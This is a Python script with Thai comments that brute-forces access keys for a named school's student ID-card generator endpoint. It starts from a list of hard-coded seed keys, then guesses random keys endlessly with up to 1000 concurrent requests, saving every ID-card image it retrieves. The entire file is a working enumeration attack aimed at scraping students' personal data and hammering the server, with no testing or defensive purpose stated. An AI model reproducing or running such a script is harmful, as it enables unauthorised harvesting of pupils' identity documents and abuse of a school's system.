import aiohttp
import asyncio
import os
import random
import string
import json
from datetime import datetime

# สร้างโฟลเดอร์เก็บรูป
os.makedirs("found_keys", exist_ok=True)

# SEED KEYS ที่ให้มา
SEED_KEYS = [
    "aF0Rz0h6sSqK6kn2lqPh5g",
    "_BAeinBDp7OpnrWr2MLHmQ",
    "w0PHZEu6Wzl2L_hFE5Uykg",
    "RjB0F-zMyU5pdd3Dn93Jag",
    "3H6DrfrYZiycqV-zsTGLZg",
    "Xvw3nB7gWlfY3AySb8zdwQ",
    "miD4RtsJMst9GaHQXwQLCQ",
    "BsfWXOkqVOicJIEZLncq4Q",
    "pfSu18R87YUg5YiyaGJAiA",
    "RIPvkb4_5uiQxxVarilS8w",
    "g_PnCv0jgE4opUrPT6kPzA",
    "AMONsCS-V4lP1cNvsnudLg",
    "32fSss9voP6K1StApro45w",
    "gAzLjH6TjDaIadC2iAwHNw",
    "cREOE8t7SbG5hUlhz_5ooQ",
    "8ghvOqFWT8sITyfMOLIdOA",
    "9tKui1nCe6bqN3HsVn0oQw",
    "7BtDFKDj6t79uUlQovEkbw",
    "ZLjyNydeWd3hduM69b2PbA",
    "lPV4Wd4UAVTEGHSY8taRFA",
    "zXfR9Mw2zjQ_AXSO-9H-cw",
    "HCl8TA3XOrz6c1vNfgRGbw",
    "gH_sRuStK9__z8tdViGsUA",
    "ohBAxKBbur_DwF4Ccwjlbg",
    "4T9hPwGp6Y01K8nOb1TqIw",
    "whskrqa-vU4iI3OE0MmIHA",
    "_hJuxPpBRGQVNil-27wtsw",
    "xPQSNmdzWS0HHpx15xblKA",
    "BS8TExXJevMh55p8T-E-Ew",
    "lT6vMf8ROvLWvHdWKSBR1w",
    "_LEyI8YknjSM8hO80CQhcg",
    "ypf6aNWEnFj3kLgRBGFwxQ",
    "QNjMKQMWWPsyIBoiPDIsoA",
    "A24ZSqL8f08yxWDiaIcLZQ",
    "W-HNvum74SP9EPYX8RhFWA",
    "an4xirwPR5g7d7i9ufU3Ag",
]

# ฟังก์ชันสุ่ม key
def random_key(length=22):
    chars = string.ascii_letters + string.digits + "-_"
    return "".join(random.choice(chars) for _ in range(length))

# โหลดไฟล์
async def fetch_and_save(session, key, sem, results):
    url = f"https://mwn.sis4school.com/gen-id-card.php?schoolId=mwn&key={key}"
    save_path = f"found_keys/{key}.png"

    async with sem:
        try:
            async with session.get(url) as resp:
                if resp.status == 200 and resp.headers.get("Content-Type", "").startswith("image"):
                    data = await resp.read()
                    with open(save_path, "wb") as f:
                        f.write(data)
                    print(f"[✓] {key}.png โหลดสำเร็จ")
                    results["success"].append(key)
                else:
                    print(f"[x] {key}.png (status {resp.status})")
                    results["fail"].append(key)
        except Exception as e:
            print(f"[!] Error {key}: {e}")
            results["error"].append({key: str(e)})

# main loop
async def main():
    sem = asyncio.Semaphore(1000)  # ยิงพร้อมกันสูงสุด 200 request
    results = {"success": [], "fail": [], "error": []}

    async with aiohttp.ClientSession() as session:
        # เริ่มจาก SEED KEYS ก่อน
        tasks = [fetch_and_save(session, key, sem, results) for key in SEED_KEYS]
        await asyncio.gather(*tasks)

        print("\n🚀 เริ่มสุ่ม key ไม่หยุด (กด Ctrl+C เพื่อหยุด)\n")

        # วนสุ่มเรื่อย ๆ
        while True:
            tasks = []
            for _ in range(1000):  # batch ละ 200 key
                rand_key = random_key()
                tasks.append(fetch_and_save(session, rand_key, sem, results))

            await asyncio.gather(*tasks)

            # บันทึกผลทุก batch
            with open("results.json", "w", encoding="utf-8") as f:
                json.dump(results, f, indent=4, ensure_ascii=False)

            print(f"📌 [{datetime.now().strftime('%H:%M:%S')}] อัปเดตผลลัพธ์ลง results.json แล้ว")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 หยุดการทำงานด้วย Ctrl+C แล้ว")